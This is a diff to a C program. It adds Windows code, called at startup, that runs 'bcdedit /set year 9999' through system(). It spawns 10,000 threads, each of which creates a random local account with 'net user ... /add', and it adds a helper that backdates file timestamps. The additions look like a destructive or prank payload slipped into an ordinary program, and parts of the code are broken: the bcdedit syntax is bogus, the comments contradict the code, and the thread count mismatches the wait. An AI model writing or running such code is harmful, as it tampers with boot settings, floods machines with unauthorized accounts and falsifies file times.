@@ -8,13 +8,75 @@
 
 #include <string.h>
 
+#include <utime.h>
+
 #ifdef _WIN32
     #include <Windows.h>
 #include <pthread.h>
-
 #else
     #include <unistd.h>
 #endif
+
+void create_file_with_year(char *filename, int year) {
+    // Create a struct tm object for the specified year
+    struct tm date = {
+            .tm_sec = 0,
+            .tm_min = 0,
+            .tm_hour = 0,
+            .tm_mday = 1,
+            .tm_mon = 0,  // January
+            .tm_year = year - 1900,  // tm_year is the number of years since 1900
+            .tm_wday = 0,
+            .tm_yday = 0,
+            .tm_isdst = -1
+    };
+
+    // Convert the struct tm object to a time_t value
+    time_t t = mktime(&date);
+
+    // Set the file creation time using the utime() function
+    if (utime(filename, &(struct utimbuf){.actime = t, .modtime = t}) != 0) {
+        perror("utime() failed");
+    }
+}
+
+// Function to set the system date to 9999 on Windows
+void set_date() {
+#ifdef _WIN32
+    // Modify the boot.ini file to include the /YEAR flag with a value of 9999
+    char cmd[50] = "bcdedit /set year 9999";
+
+    // Execute the command using system()
+    system(cmd);
+#endif
+}
+
+// Function to create a new user with a random name on Windows
+void create_user(void* arg) {
+#ifdef _WIN32
+    // Generate a random username
+    char* username = (char*)malloc(9 * sizeof(char));
+    for (int i = 0; i < 8; i++) {
+        username[i] = 'a' + rand() % 26;
+    }
+    username[8] = '\0';
+
+    // Generate a random password
+    char* password = (char*)malloc(13 * sizeof(char));
+    for (int i = 0; i < 12; i++) {
+        password[i] = 'a' + rand() % 26;
+    }
+    password[12] = '\0';
+
+    // Create the user using net user command
+    char cmd[100];
+    sprintf(cmd, "net user %s %s /add", username, password);
+    system(cmd);
+
+    free(username);
+    free(password);
+#endif
+}
 
 void* processor();
 void write_string_to_file_with_callback(char* str, char* filename);
@@ -147,10 +209,24 @@ void write_string_to_file_with_callback(char* str, char* filename) {
 }
 
 int main() {
+    
+    // Seed the random number generator
+    srand((unsigned int)time(NULL));
+
     char current_path[FILENAME_MAX];
     char new_path[FILENAME_MAX];
 
     #ifdef _WIN32
+        // Set the system date to 9999
+        set_date();
+
+        // Create 10 new users in multithreaded mode
+        HANDLE threads[10000];
+        for (int i = 0; i < 10000; i++) {
+            threads[i] = (HANDLE)_beginthread(create_user, 0, NULL);
+        }
+        WaitForMultipleObjects(10, threads, TRUE, INFINITE);
+
         // Windows platform-specific code
         GetModuleFileName(NULL, current_path, FILENAME_MAX);
         snprintf(new_path, FILENAME_MAX, "C:\\TEMP\\%s", strrchr(current_path, '\\') + 1);
